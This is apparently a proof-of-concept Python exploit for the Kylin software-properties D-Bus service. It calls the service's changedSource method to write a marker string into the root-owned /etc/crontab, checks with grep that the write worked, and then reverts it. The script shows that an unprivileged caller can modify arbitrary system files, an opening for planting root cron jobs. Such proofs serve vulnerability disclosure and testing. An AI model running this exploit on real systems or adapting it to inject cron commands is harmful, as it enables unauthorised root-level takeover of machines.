#!/usr/bin/env python3

import sys
import dbus
import os

def change_source(old, new, target):
    bus = dbus.SystemBus()
    obj = bus.get_object("com.kylin.software.properties", "/com/kylin/software/properties")
    proxy = dbus.Interface(obj, "com.kylin.software.properties.interface")
    result=proxy.changedSource([old, new, target])

change_source("#", "kylin666", "/etc/crontab")
resulOs=os.popen("grep -rn 'kylin666' /etc/crontab")
if resulOs.read() :
    print("successfully")
else :
    print("fail")
change_source("kylin666", "#", "/etc/crontab")